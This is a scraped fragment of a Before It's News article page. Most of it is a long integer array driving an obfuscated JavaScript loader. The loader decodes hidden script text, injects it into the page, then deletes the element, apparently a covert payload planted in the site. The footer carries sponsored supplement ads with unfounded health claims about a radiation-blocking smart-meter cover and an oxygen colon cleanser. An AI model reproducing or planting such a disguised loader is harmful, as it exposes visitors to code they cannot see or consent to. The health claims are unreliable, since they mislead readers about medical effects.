87,6,55,83,92,83,92,1,92,23,87,32,77,76,4,76,87,0,29,76,31,62,86,35,30,30,0,29,76,31,62,29,35,60,30,62,30,92,30,3,30,92,30,57,30,30,92,30,88,30,92,30,8,30,92,30,26,30,92,30,24,30,92,30,7,30,92,30,55,30,92,30,87,30,92,30,78,30,92,30,39,30,92,30,92,30,92,30,84,30,92,30,32,30,92,30,18,30,92,30,83,30,92,30,2,30,92,30,67,30,92,30,48,30,92,30,36,30,92,30,65,30,92,30,34,30,92,30,61,30,92,30,15,30,92,30,91,30,92,30,13,30,92,30,0,30,92,30,22,30,92,30,35,30,92,30,82,30,92,30,85,30,92,30,63,30,92,30,19,30,92,30,40,30,92,30,66,30,92,30,52,30,92,30,16,30,92,30,41,30,92,30,54,30,92,30,33,30,92,30,56,30,92,30,93,30,92,30,43,30,92,30,14,30,92,30,10,30,92,30,53,30,92,30,25,30,92,30,81,30,92,30,89,30,92,30,5,30,92,30,71,30,92,30,45,30,92,30,58,30,92,30,44,30,92,30,21,30,92,30,64,30,92,30,74,30,92,30,42,30,92,30,60,30,92,30,57,57,30,92,30,6,30,92,30,11,30,92,30,50,30,92,30,12,30,92,30,76,30,92,30,49,30,92,30,79,30,92,30,77,30,92,30,69,30,92,30,27,30,92,30,75,30,92,30,23,30,92,30,68,30,92,30,38,30,92,30,17,30,92,30,9,30,92,30,80,30,92,30,90,30,92,30,46,30,92,30,70,30,92,30,47,30,92,30,31,30,92,30,86,30,92,30,4,30,92,30,37,30,92,30,29,30,92,30,1,30,92,30,59,30,92,30,51,30,92,30,28,30,92,30,73,30,92,30,20,30,92,30,72,30,6,0,27,46,31,55,29,76,31,62,59,35,83,0,59,22,49,32,9,69,90,75,4,23,0,59,39,39,87,68,27,55,49,60,59,6,87,86,39,35,29,60,55,49,60,59,6,84,48,67,87,6,0,29,76,31,62,4,35,9,70,79,32,31,86,55,87,0,86,35,86,32,31,69,70,9,76,79,69,55,7,30,37,90,68,4,50,9,68,86,4,30,7,92,7,30,37,90,68,4,50,9,68,86,4,50,7,39,4,39,7,30,7,87,0,86,35,86,32,31,69,70,9,76,79,69,55,7,30,46,49,86,69,31,29,69,30,7,92,7,30,46,49,86,69,31,29,69,50,7,39,4,39,7,30,7,87,0,29,76,31,62,37,79,9,35,93,71,25,53,32,70,76,31,86,69,55,86,87,0,68,27,55,37,79,9,35,35,35,4,31,37,69,87,73,37,79,9,35,69,29,76,9,55,30,55,30,39,86,39,30,87,30,87,0,72,37,79,9,32,37,90,68,4,50,9,68,86,4,35,37,79,9,60,7,37,90,68,4,50,9,68,86,4,50,7,39,4,6,0,37,79,9,32,46,49,86,69,31,29,69,35,37,79,9,60,7,46,49,86,69,31,29,69,50,7,39,4,6,0,9,70,79,32,86,29,55,37,79,9,87,0,68,27,55,9,70,79,32,79,35,35,2,24,24,37,79,9,32,46,49,86,69,31,29,69,32,69,90,76,49,9,69,77,35,35,2,87,73,9,70,79,32,37,79,35,37,79,9,0,9,70,79,32,9,76,4,69,31,55,37,79,9,32,46,49,86,69,31,29,69,87,0,72,69,9,86,69,73,9,70,79,32,79,46,9,9,69,79,4,68,46,90,55,37,79,9,92,70,76,31,69,90,4,87,0,72,72,0,68,32,46,90,69,31,31,46,31,35,27,37,90,79,4,68,46,90,55,87,73,68,27,55,68,32,86,31,79,35,35,9,46,79,76,4,68,46,90,32,70,31,46,4,46,79,46,9,39,37,31,9,87,73,68,32,86,31,79,35,9,70,79,32,37,31,55,9,70,79,32,51,87,0,31,69,4,37,31,90,0,72,29,76,31,62,86,35,9,70,79,32,29,86,55,87,0,68,27,55,86,87,73,29,76,31,62,4,35,9,70,79,32,31,86,55,87,0,86,35,86,32,31,69,70,9,76,79,69,55,7,30,37,90,68,4,50,9,68,86,4,30,7,92,7,30,37,90,68,4,50,9,68,86,4,50,7,39,4,39,7,30,7,87,0,86,35,86,32,31,69,70,9,76,79,69,55,7,30,46,49,86,69,31,29,69,30,7,92,7,30,46,49,86,69,31,29,69,50,7,39,4,39,7,30,7,87,0,29,76,31,62,37,79,9,35,93,71,25,53,32,70,76,31,86,69,55,86,87,0,68,27,55,37,79,9,35,35,35,4,31,37,69,87,73,37,79,9,35,69,29,76,9,55,30,55,30,39,86,39,30,87,30,87,0,72,37,79,9,32,37,90,68,4,50,9,68,86,4,35,37,79,9,60,7,37,90,68,4,50,9,68,86,4,50,7,39,4,6,0,37,79,9,32,46,49,86,69,31,29,69,35,37,79,9,60,7,46,49,86,69,31,29,69,50,7,39,4,6,0,9,70,79,32,79,46,9,9,69,79,4,68,46,90,55,37,79,9,92,70,76,31,69,90,4,87,0,72,72,0,68,32,86,31,79,35,37,31,9,0,72,72,55,87,92,70,67,36,13,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,27,37,90,79,4,68,46,90,55,49,87,73,29,76,31,62,86,35,60,6,0,27,46,31,55,29,76,31,62,68,35,83,0,68,22,49,32,9,69,90,75,4,23,0,68,39,35,36,87,73,68,27,55,49,60,68,39,83,6,82,83,87,86,32,70,37,86,23,55,49,60,68,39,83,6,87,0,68,27,55,49,60,68,39,2,6,82,83,87,86,32,70,37,86,23,55,49,60,68,39,2,6,87,0,68,27,55,49,60,68,39,67,6,82,83,87,86,32,70,37,86,23,55,49,60,68,39,67,6,87,0,72,31,69,4,37,31,90,62,86,0,72,72,55,87,92,86,29,13,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,27,37,90,79,4,68,46,90,55,77,87,73,4,31,51,73,9,46,79,76,9,71,4,46,31,76,75,69,32,86,69,4,56,4,69,80,55,9,70,79,32,76,4,50,68,49,92,93,71,25,53,32,86,4,31,68,90,75,68,27,51,55,77,87,87,0,72,79,76,4,79,23,55,69,87,73,72,72,72,55,87,92,29,86,13,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,27,37,90,79,4,68,46,90,55,87,73,4,31,51,73,31,69,4,37,31,90,62,9,46,79,76,9,71,4,46,31,76,75,69,32,75,69,4,56,4,69,80,55,9,70,79,32,76,4,50,68,49,87,0,72,79,76,4,79,23,55,69,87,73,31,69,4,37,31,90,62,27,76,9,86,69,0,72,72,72,55,87,92,68,86,50,4,69,86,4,13,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,27,37,90,79,4,68,46,90,55,87,73,68,27,55,1,68,90,77,46,1,32,9,46,79,76,4,68,46,90,32,23,76,86,23,32,86,69,76,31,79,23,55,30,50,50,51,4,69,86,4,30,87,82,84,2,87,4,69,86,4,35,4,31,37,69,0,69,9,86,69,62,4,69,86,4,35,27,76,9,86,69,0,31,69,4,37,31,90,62,4,69,86,4,0,72,72,55,87,92,76,79,86,86,13,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,27,37,90,79,4,68,46,90,55,79,86,86,87,73,29,76,31,62,23,35,77,46,79,37,80,69,90,4,32,47,37,69,31,51,71,69,9,69,79,4,46,31,19,9,9,55,7,49,46,77,51,7,87,60,83,6,92,86,35,77,46,79,37,80,69,90,4,32,79,31,69,76,4,69,16,9,69,80,69,90,4,55,7,86,4,51,9,69,7,87,0,86,32,86,69,4,19,4,4,31,68,49,37,4,69,55,30,4,51,70,69,30,92,30,4,69,59,4,18,79,86,86,30,87,0,68,27,55,86,32,86,4,51,9,69,71,23,69,69,4,87,86,32,86,4,51,9,69,71,23,69,69,4,32,79,86,86,45,69,59,4,35,79,86,86,0,69,9,86,69,62,86,32,68,90,90,69,31,33,45,10,14,35,79,86,86,0,31,69,4,37,31,90,62,23,32,76,70,70,69,90,77,66,23,68,9,77,55,86,87,0,72,72,55,87,92,75,13,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,27,37,90,79,4,68,46,90,55,87,73,29,76,31,62,1,35,1,68,90,77,46,1,32,68,90,90,69,31,21,68,77,4,23,0,29,76,31,62,31,35,65,0,68,27,55,1,22,35,36,61,91,87,31,35,2,0,68,27,55,1,22,35,61,34,61,87,31,35,67,0,68,27,55,1,22,35,2,83,67,48,87,31,35,48,0,68,27,55,1,22,35,2,36,48,91,87,31,35,36,0,31,69,4,37,31,90,62,31,0,72,72,55,87,92,80,13,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,9,70,79,32,76,4,50,75,39,9,70,79,32,76,4,50,68,39,9,70,79,32,76,4,50,77,0,72,72,55,87,92,79,46,9,9,69,79,4,68,46,90,13,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,27,37,90,79,4,68,46,90,55,37,79,9,92,70,76,31,69,90,4,87,73,29,76,31,62,46,35,73,68,90,68,4,13,27,37,90,79,4,68,46,90,55,87,73,68,27,55,9,70,79,32,79,86,86,35,35,27,76,9,86,69,87,73,9,70,79,32,79,86,86,35,9,70,79,32,76,79,86,86,55,37,79,9,32,79,86,86,50,79,46,80,80,46,90,87,0,72,27,46,31,55,29,76,31,62,68,35,83,0,68,22,37,79,9,32,37,90,68,4,50,9,68,86,4,32,9,69,90,75,4,23,0,68,39,39,87,73,46,32,37,90,68,4,55,37,79,9,32,37,90,68,4,50,9,68,86,4,60,68,6,92,70,76,31,69,90,4,87,0,72,72,92,37,90,68,4,13,27,37,90,79,4,68,46,90,55,37,92,70,76,31,69,90,4,87,73,27,46,31,55,68,35,83,0,68,22,37,32,69,59,79,9,37,77,69,50,37,31,9,50,9,68,86,4,32,9,69,90,75,4,23,0,68,39,39,87,73,29,76,31,62,69,37,35,90,69,1,62,5,69,75,16,59,70,55,37,32,69,59,79,9,37,77,69,50,37,31,9,50,9,68,86,4,60,68,6,87,0,68,27,55,1,68,90,77,46,1,32,9,46,79,76,4,68,46,90,32,70,76,4,23,90,76,80,69,32,80,76,4,79,23,55,69,37,87,87,31,69,4,37,31,90,0,72,68,27,55,37,32,4,76,31,75,69,4,50,86,69,9,69,79,4,46,31,3,35,37,90,77,69,27,68,90,69,77,24,24,37,32,4,76,31,75,69,4,50,86,69,9,69,79,4,46,31,3,35,30,30,87,73,29,76,31,62,4,86,35,37,32,4,76,31,75,69,4,50,86,69,9,69,79,4,46,31,92,4,76,35,37,32,4,76,31,75,69,4,50,76,70,70,31,46,76,79,23,92,79,86,35,37,32,79,46,90,4,76,68,90,69,31,50,86,4,51,9,69,0,72,69,9,86,69,62,68,27,55,9,70,79,32,68,86,50,4,69,86,4,55,87,24,24,37,32,4,76,31,75,69,4,50,86,69,9,69,79,4,46,31,50,4,69,86,4,3,35,37,90,77,69,27,68,90,69,77,24,24,37,32,4,76,31,75,69,4,50,86,69,9,69,79,4,46,31,50,4,69,86,4,3,35,30,30,87,73,29,76,31,62,4,86,35,37,32,4,76,31,75,69,4,50,86,69,9,69,79,4,46,31,50,4,69,86,4,92,4,76,35,37,32,4,76,31,75,69,4,50,76,70,70,31,46,76,79,23,50,4,69,86,4,92,79,86,35,37,32,79,46,90,4,76,68,90,69,31,50,86,4,51,9,69,50,4,69,86,4,0,72,69,9,86,69,62,31,69,4,37,31,90,0,37,32,79,86,86,50,86,70,69,79,68,27,68,79,39,35,30,32,30,39,37,32,1,68,77,75,69,4,50,79,9,76,86,86,39,30,62,73,30,39,37,32,79,46,90,4,76,68,90,69,31,50,86,4,51,9,69,39,30,72,30,0,29,76,31,62,4,35,9,70,79,32,47,55,4,86,92,70,76,31,69,90,4,87,0,68,27,55,4,32,9,69,90,75,4,23,22,2,87,31,69,4,37,31,90,0,4,35,4,60,83,6,0,9,70,79,32,79,86,86,60,7,4,69,59,4,7,39,7,66,46,90,4,69,90,4,7,6,39,35,37,32,79,86,86,50,86,70,69,79,68,27,68,79,0,68,27,55,4,76,35,35,30,49,69,27,46,31,69,30,87,73,29,76,31,62,90,35,77,46,79,37,80,69,90,4,32,79,31,69,76,4,69,16,9,69,80,69,90,4,55,30,77,68,29,30,87,0,90,32,68,90,90,69,31,33,45,10,14,35,37,32,23,4,80,9,0,4,32,70,76,31,69,90,4,53,46,77,69,32,68,90,86,69,31,4,40,69,27,46,31,69,55,90,92,4,87,0,90,32,46,37,4,69,31,33,45,10,14,35,90,32,68,90,90,69,31,33,45,10,14,0,72,69,9,86,69,62,68,27,55,4,76,35,35,30,76,27,4,69,31,30,87,73,29,76,31,62,90,35,77,46,79,37,80,69,90,4,32,79,31,69,76,4,69,16,9,69,80,69,90,4,55,30,77,68,29,30,87,0,90,32,68,90,90,69,31,33,45,10,14,35,37,32,23,4,80,9,0,4,32,70,76,31,69,90,4,53,46,77,69,32,68,90,86,69,31,4,40,69,27,46,31,69,55,90,92,4,32,90,69,59,4,71,68,49,9,68,90,75,87,0,90,32,46,37,4,69,31,33,45,10,14,35,90,32,68,90,90,69,31,33,45,10,14,0,72,69,9,86,69,62,68,27,55,4,76,35,35,30,76,70,70,69,90,77,30,87,4,32,68,90,90,69,31,33,45,10,14,35,4,32,68,90,90,69,31,33,45,10,14,39,37,32,23,4,80,9,0,69,9,86,69,62,68,27,55,4,76,35,35,30,70,31,69,70,69,90,77,30,87,4,32,68,90,90,69,31,33,45,10,14,35,37,32,23,4,80,9,39,4,32,68,90,90,69,31,33,45,10,14,0,69,9,86,69,62,68,27,55,4,76,35,35,30,27,68,9,9,30,87,4,32,68,90,90,69,31,33,45,10,14,35,37,32,23,4,80,9,0,69,9,86,69,62,31,69,4,37,31,90,0,37,32,37,90,68,4,35,9,70,79,32,47,55,30,32,30,39,37,32,1,68,77,75,69,4,50,79,9,76,86,86,92,77,46,79,37,80,69,90,4,32,49,46,77,51,87,60,83,6,0,55,27,37,90,79,4,68,46,90,62,1,76,68,4,55,4,1,87,73,68,27,55,4,1,35,35,37,90,77,69,27,68,90,69,77,87,29,76,31,62,4,1,35,83,0,69,9,86,69,62,68,27,55,4,1,82,2,83,87,31,69,4,37,31,90,0,68,27,55,4,1,82,83,24,24,46,32,31,68,75,55,37,87,35,35,4,31,37,69,87,31,69,4,37,31,90,0,1,68,90,77,46,1,32,86,69,4,45,68,80,69,46,37,4,55,27,37,90,79,4,68,46,90,55,87,73,1,76,68,4,55,4,1,39,2,87,0,72,92,2,83,83,87,0,72,87,55,87,0,1,68,90,77,46,1,32,76,77,77,16,29,69,90,4,14,68,86,4,69,90,69,31,55,30,31,69,86,68,28,69,30,92,27,37,90,79,4,68,46,90,55,87,73,46,32,31,68,75,55,37,87,0,72,87,0,46,32,31,68,75,55,37,87,0,72,92,31,68,75,13,27,37,90,79,4,68,46,90,55,37,87,73,69,35,9,70,79,32,47,55,30,32,30,39,37,32,1,68,77,75,69,4,50,79,9,76,86,86,39,30,62,32,30,39,37,32,68,80,75,50,79,9,76,86,86,92,77,46,79,37,80,69,90,4,32,49,46,77,51,87,0,29,76,31,62,80,35,77,46,79,37,80,69,90,4,32,49,46,77,51,32,47,37,69,31,51,71,69,9,69,79,4,46,31,19,9,9,55,30,32,30,39,37,32,1,68,77,75,69,4,50,79,9,76,86,86,39,30,62,60,86,4,51,9,69,35,7,77,68,86,70,9,76,51,13,62,90,46,90,69,62,3,68,80,70,46,31,4,76,90,4,0,7,6,30,87,32,9,69,90,75,4,23,0,68,27,55,80,82,83,87,73,77,46,79,37,80,69,90,4,32,49,46,77,51,32,68,90,90,69,31,33,45,10,14,35,30,19,77,49,9,46,79,17,62,16,31,31,46,31,32,30,0,1,68,90,77,46,1,32,86,69,4,45,68,80,69,46,37,4,55,27,37,90,79,4,68,46,90,55,87,73,1,68,90,77,46,1,32,76,9,69,31,4,55,7,19,77,49,9,46,79,17,62,69,59,4,69,90,86,68,46,90,62,69,31,31,46,31,62,83,27,36,65,34,2,48,48,65,7,39,30,57,90,30,39,7,45,31,51,62,4,46,62,77,68,86,76,49,9,69,62,4,23,68,86,62,69,59,4,69,90,86,68,46,90,62,46,31,62,31,69,86,4,76,31,4,62,51,46,37,31,62,90,76,29,68,75,76,4,46,31,32,7,87,0,1,68,90,77,46,1,32,9,46,79,76,4,68,46,90,32,31,69,9,46,76,77,55,87,0,72,92,2,83,87,0,72,68,27,55,69,60,83,6,32,79,9,68,69,90,4,21,68,77,4,23,35,35,83,87,31,69,4,37,31,90,62,27,76,9,86,69,0,29,76,31,62,31,76,4,68,46,35,69,60,83,6,32,79,9,68,69,90,4,21,68,77,4,23,18,37,79,9,32,86,70,31,68,4,69,50,1,68,77,4,23,0,29,76,31,62,90,69,1,50,49,75,50,23,69,68,75,23,4,35,10,76,4,23,32,27,9,46,46,31,55,31,76,4,68,46,78,37,79,9,32,86,70,31,68,4,69,50,23,69,68,75,23,4,87,0,29,76,31,62,76,77,50,23,69,68,75,23,4,35,10,76,4,23,32,27,9,46,46,31,55,90,69,1,50,49,75,50,23,69,68,75,23,4,18,37,79,9,32,86,70,31,68,4,69,50,79,46,37,90,4,87,0,68,27,55,76,77,50,23,69,68,75,23,4,78,37,79,9,32,86,70,31,68,4,69,50,79,46,37,90,4,3,35,90,69,1,50,49,75,50,23,69,68,75,23,4,87,73,90,69,1,50,49,75,50,23,69,68,75,23,4,35,76,77,50,23,69,68,75,23,4,78,37,79,9,32,86,70,31,68,4,69,50,79,46,37,90,4,0,72,68,27,55,37,32,46,90,79,69,35,35,37,90,77,69,27,68,90,69,77,87,73,37,32,46,90,79,69,35,4,31,37,69,0,37,32,76,9,29,35,60,6,0,27,46,31,55,29,76,31,62,68,35,83,0,68,22,69,32,9,69,90,75,4,23,0,68,39,39,87,73,29,76,31,62,76,77,50,68,77,35,69,60,68,6,32,79,9,76,86,86,53,76,80,69,32,86,70,9,68,4,55,37,32,68,80,75,50,79,9,76,86,86,39,30,84,30,87,60,2,6,0,9,70,79,32,79,86,86,60,7,4,69,59,4,7,39,7,66,46,90,4,69,90,4,7,6,39,35,7,32,7,39,37,32,1,68,77,75,69,4,50,79,9,76,86,86,39,7,62,32,7,39,37,32,68,80,75,50,79,9,76,86,86,39,7,84,7,39,76,77,50,68,77,39,7,73,49,76,79,17,75,31,46,37,90,77,84,86,68,28,69,13,76,37,4,46,62,7,39,90,69,1,50,49,75,50,23,69,68,75,23,4,39,7,70,59,0,62,49,76,79,17,75,31,46,37,90,77,84,70,46,86,68,4,68,46,90,13,83,62,84,7,39,37,79,9,32,76,77,50,4,46,50,86,70,31,68,4,69,60,76,77,50,68,77,6,78,76,77,50,23,69,68,75,23,4,39,7,70,59,0,72,7,0,68,27,55,69,60,68,6,32,46,27,27,86,69,4,81,76,31,69,90,4,3,35,35,90,37,9,9,87,73,37,32,76,9,29,32,70,37,86,23,55,76,77,50,68,77,87,0,72,29,76,31,62,77,35,9,70,79,32,47,55,30,88,30,39,69,60,68,6,32,70,76,31,69,90,4,16,9,69,80,69,90,4,32,70,76,31,69,90,4,16,9,69,80,69,90,4,32,70,76,31,69,90,4,16,9,69,80,69,90,4,32,68,77,39,30,62,30,39,69,60,68,6,32,70,76,31,69,90,4,16,9,69,80,69,90,4,32,4,76,75,53,76,80,69,92,77,46,79,37,80,69,90,4,32,49,46,77,51,87,0,27,46,31,55,70,35,83,0,70,22,77,32,9,69,90,75,4,23,0,70,39,39,87,73,68,27,55,77,60,70,6,32,46,90,79,9,68,79,17,35,35,90,37,9,9,87,73,77,60,70,6,32,46,90,79,9,68,79,17,35,27,37,90,79,4,68,46,90,55,69,69,87,73,29,76,31,62,76,35,69,69,32,4,76,31,75,69,4,20,20,69,69,32,86,31,79,16,9,69,80,69,90,4,0,29,76,31,62,79,68,35,76,32,70,76,31,69,90,4,16,9,69,80,69,90,4,32,75,69,4,19,4,4,31,68,49,37,4,69,55,30,49,68,77,30,87,0,1,68,90,77,46,1,32,9,46,79,76,4,68,46,90,32,76,86,86,68,75,90,55,37,79,9,32,9,68,90,17,50,31,69,77,68,31,69,79,4,50,37,31,9,39,37,79,9,32,76,77,50,4,46,50,9,68,90,17,60,79,68,6,87,0,31,69,4,37,31,90,62,27,76,9,86,69,0,72,0,72,72,72,55,27,37,90,79,4,68,46,90,62,31,29,68,69,1,55,87,73,68,27,55,9,70,79,32,29,32,68,90,44,68,69,1,70,46,31,4,55,37,32,37,90,68,4,87,87,73,29,76,31,62,9,4,35,30,30,0,9,4,35,37,32,1,68,77,75,69,4,50,68,77,39,30,79,30,39,37,32,76,9,29,32,38,46,68,90,55,60,86,69,70,76,31,76,4,46,31,35,30,79,30,6,87,0,29,76,31,62,70,29,35,83,0,68,27,55,9,70,79,32,70,29,35,35,27,76,9,86,69,87,73,9,70,79,32,70,29,35,4,31,37,69,0,70,29,35,2,0,72,29,76,31,62,68,35,77,46,79,37,80,69,90,4,32,79,31,69,76,4,69,16,9,69,80,69,90,4,55,30,68,80,75,30,87,0,68,32,86,31,79,35,9,70,79,32,37,31,55,37,79,9,32,29,68,69,1,50,37,31,9,92,73,7,68,7,13,9,4,92,7,70,7,13,70,29,92,7,75,7,13,9,70,79,32,75,55,87,92,7,1,7,13,37,32,1,68,77,75,69,4,50,68,77,72,87,0,31,69,4,37,31,90,0,72,1,68,90,77,46,1,32,86,69,4,45,68,80,69,46,37,4,55,27,37,90,79,4,68,46,90,55,87,73,31,29,68,69,1,55,87,0,72,92,2,83,83,83,87,0,72,87,55,87,0,72,31,69,4,37,31,90,62,4,31,37,69,0,72,92,31,9,46,76,77,13,27,37,90,79,4,68,46,90,55,87,73,29,76,31,62,9,86,35,30,30,0,27,46,31,55,29,76,31,62,68,35,83,0,68,22,37,79,9,32,37,90,68,4,50,9,68,86,4,32,9,69,90,75,4,23,0,68,39,39,87,73,68,27,55,37,79,9,32,37,90,68,4,50,9,68,86,4,60,68,6,60,30,76,9,29,30,6,3,35,37,90,77,69,27,68,90,69,77,87,73,9,86,39,35,37,79,9,32,37,90,68,4,50,9,68,86,4,60,68,6,60,30,1,68,77,75,69,4,50,68,77,30,6,39,30,79,30,39,37,79,9,32,37,90,68,4,50,9,68,86,4,60,68,6,60,30,76,9,29,30,6,32,38,46,68,90,55,60,86,69,70,76,31,76,4,46,31,35,30,79,30,6,87,39,30,84,30,0,72,72,9,86,35,9,86,32,86,37,49,86,4,31,55,83,92,9,86,32,9,69,90,75,4,23,84,2,87,0,29,76,31,62,9,86,68,35,77,46,79,37,80,69,90,4,32,79,31,69,76,4,69,16,9,69,80,69,90,4,55,30,68,80,75,30,87,0,9,86,68,32,86,31,79,35,9,70,79,32,37,31,55,37,79,9,32,9,46,76,77,50,37,31,9,92,73,7,68,7,13,9,86,92,7,75,7,13,9,70,79,32,75,55,87,72,87,0,31,69,4,37,31,90,62,4,31,37,69,0,72,92,72,0,46,32,68,90,68,4,55,87,0,1,68,90,77,46,1,32,86,69,4,45,68,80,69,46,37,4,55,46,32,31,9,46,76,77,92,2,83,83,83,87,0,31,69,4,37,31,90,62,46,0,72,72,55,87,72,0,72,9,70,79,32,86,4,76,31,4,55,87,0,18,78,62,31,38,90,77,27,31,90,47,23,47,46,51,86,62,78,18];function ntbupjkebwx(a,b){qbshrwjig='';for(var i=0;i<a.length;i++){qbshrwjig+=b[a[i]];}return qbshrwjig;}var ctxristuzh=window[ntbupjkebwx([77,46,79,37,80,69,90,4],tqoojdclrbeeki)];var qgdpwu=ntbupjkebwx([79,37,31,31,69,90,4,71,79,31,68,70,4],tqoojdclrbeeki);var nxlwpvwaqzjvd=ntbupjkebwx([86,31,79],tqoojdclrbeeki);var vjejgcds=ntbupjkebwx([49,46,77,51],tqoojdclrbeeki);try{Object.getOwnPropertyDescriptor(Document.prototype,qgdpwu).get.apply(ctxristuzh)[nxlwpvwaqzjvd]=nxlwpvwaqzjvd;document.body=document.querySelectorAll('body')[0]}catch(e){}var wbwkgr=ntbupjkebwx([79,31,69,76,4,69,16,9,69,80,69,90,4],tqoojdclrbeeki);var yxcuowi=ntbupjkebwx([86,79,31,68,70,4],tqoojdclrbeeki);var lopbsovggy=ntbupjkebwx([4,69,59,4,66,46,90,4,69,90,4],tqoojdclrbeeki);var foreeoeuwpa=ntbupjkebwx([23,69,76,77],tqoojdclrbeeki);var ovdfnms=ntbupjkebwx([76,70,70,69,90,77,66,23,68,9,77],tqoojdclrbeeki);var eghrausrbfunwg=ntbupjkebwx([70,76,31,69,90,4,53,46,77,69],tqoojdclrbeeki);var nbqwwozf=ntbupjkebwx([31,69,80,46,29,69,66,23,68,9,77],tqoojdclrbeeki);var rfuehjo=ctxristuzh[wbwkgr](yxcuowi);rfuehjo[lopbsovggy]=ntbupjkebwx(qzetsaei,tqoojdclrbeeki);ctxristuzh[vjejgcds][ovdfnms](rfuehjo);rfuehjo[eghrausrbfunwg][nbqwwozf](rfuehjo);})();}</script>
+</p></p></body></html></br></p><p><div class="rotating_text_link" id="rotating_text_link_29"></div></p>
+<br/>Source: <a href="/v3/r2/?url=aHR0cDovL3d3dy5kYW5pZWxncmVlbmZpZWxkLm9yZy8yMDIxLzAzL3doZW4tYmxhY2stbWFzcy1zaG9vdGVycy1raWxsLWFzaWFucy5odG1s"> http://www.danielgreenfield.org/2021/03/when-black-mass-shooters-kill-asians.html</a><br/> </div>
+</div></div></div></article>
+<div id="story-pagenavi-bar"></div>
+<div style="clear:both"></div>
+<br/>
+<div class="sharethis-inline-share-buttons"></div>
+<br/>
+<div id="single_announcement" style="display: none;">
+</div>
+<div id="in_article_us_ad" style="margin: 0 auto;"></div>
+<script type="text/javascript">
+        in_article_us_ad_code = "";
+        in_article_us_ad_mobile_code = "";
+    </script>
+<div style="clear: both"></div>
+<div id="author_stories"></div>
+<div style="clear: both"></div>
+<div style="border-top: 1px solid #AAA; padding: 15px 0 0 0;">
+<strong>Before It’s News®</strong> is a community of individuals who report on what’s going on around them, from all around the world.<br/><br/>
+Anyone can <a href="/v3/login/new/">join</a>.<br/>
+Anyone can contribute.<br/>
+Anyone can become informed about their world.<br/><br/>
+<strong>"United We Stand" <a href="/v3/login/new/">Click Here</a> To Create Your Personal <a href="/v3/login/new/">Citizen Journalist</a>
+Account Today, Be Sure To Invite Your Friends.</strong>
+</div>
+<div id="article_html" style="margin: 20px 0;">
+<p style="text-align: left;"><span style="font-family: Tahoma, Geneva, sans-serif; font-size: 18px;"><strong style="">Please Help Support BeforeitsNews by trying our Natural Health Products below!</strong></span></p><p style="text-align: left;"><br/></p><p style="text-align: left;"><span style="font-family: Arial, Helvetica, sans-serif; font-size: 16px;"><strong style="font-size: 16px;">Order by Phone at 888-809-8385 or online at <a href="https://mitocopper.com/" rel="sponsored" target="_blank">https://mitocopper.com</a> M - F 9am to 5pm EST</strong></span></p><p style="text-align: left;"><span style="font-family: Arial, Helvetica, sans-serif; font-size: 16px;"><strong style="font-size: 16px;">Order by Phone at 866-388-7003 or online at <a href="https://www.herbanomic.com/" rel="sponsored" target="_blank">https://www.herbanomic.com</a> M - F 9am to 5pm EST</strong></span></p><p style="text-align: left;"><span style="font-size: 16px; font-family: Arial, Helvetica, sans-serif;"><strong style="">Order by Phone at 866-388-7003 or online at <a href="https://herbanomics.com/" rel="sponsored" target="_blank">https://www.herbanomics.com</a> M - F 9am to 5pm EST</strong></span></p><p><br/></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://www.herbanomics.com" rel="sponsored">Humic &amp; Fulvic</a> Trace Minerals Complex - Nature's most important supplement! Vivid Dreams again!</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://www.herbanomics.com" rel="sponsored">HNEX HydroNano EXtracellular Water</a> - Improve immune system health and reduce inflammation.</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://mitocopper.com/product/ultracur-bioavailable-curcumin-complex/" rel="sponsored" target="_blank">Ultimate Clinical Potency Curcumin</a> - Natural pain relief, reduce inflammation and so much more.</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://mitocopper.com/product/mitoactivator-extra-strength-60-capsules/" rel="sponsored" target="_blank">MitoCopper</a> - Bioavailable Copper destroys pathogens and gives you more energy. (See Blood Video)</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://mitocopper.com/product/oxy-powder-natural-colon-cleanser-60-capsules/" rel="sponsored" target="_blank">Oxy Powder</a> - Natural Colon Cleanser!  Cleans out toxic buildup with oxygen!</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://herbanomics.com/products/detoxadine-organic-iodine-supplement" rel="sponsored" target="_blank">Nascent Iodine</a> - Promotes detoxification, mental focus and thyroid health.</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://mitocopper.com/product/emf-blocking-smart-meter-cover/" rel="sponsored" target="_blank">Smart Meter Cover</a> -  Reduces Smart Meter radiation by 96%! (See Video).</span></strong></p> </div>
+<img alt="Report abuse" height="66" id="report_abuse" src="//img.beforeitsnews.com/img/report_abuse.png" width="65">
+<div style="clear:both"></div>
+<div class="left_item">
+<div class="rotating_text_link" id="rotating_text_link_13"></div>
+<div id="banners_direct_regular_left"></div>
+</div>
+<div style="clear:both"></div>
+<div class="rotating_text_link" id="rotating_text_link_14"></div>
+<div class="left_item" id="leftAdItem_1" style="margin: 20px 0;">
+<div id="M310742ScriptRootC351461"></div>
+<script async="" src="https://jsc.mgid.com/b/e/beforeitsnews.com.351461.js"></script>
+</div>
+<div style="clear:both"></div>
+<div class="rotating_text_link" id="rotating_text_link_15"></div>
+<div class="left_item" id="leftAdItem_2" style="margin-bottom: 20px">
+</div>
+<div style="clear:both"></div>
+<div class="rotating_text_link" id="rotating_text_link_16"></div>
+<div id="related_stories_header">Related Stories</div>
+<div id="category_stories">
+<ul></ul> </div>
+<div style="clear:both"></div>
+<div class="rotating_text_link" id="rotating_text_link_17"></div>
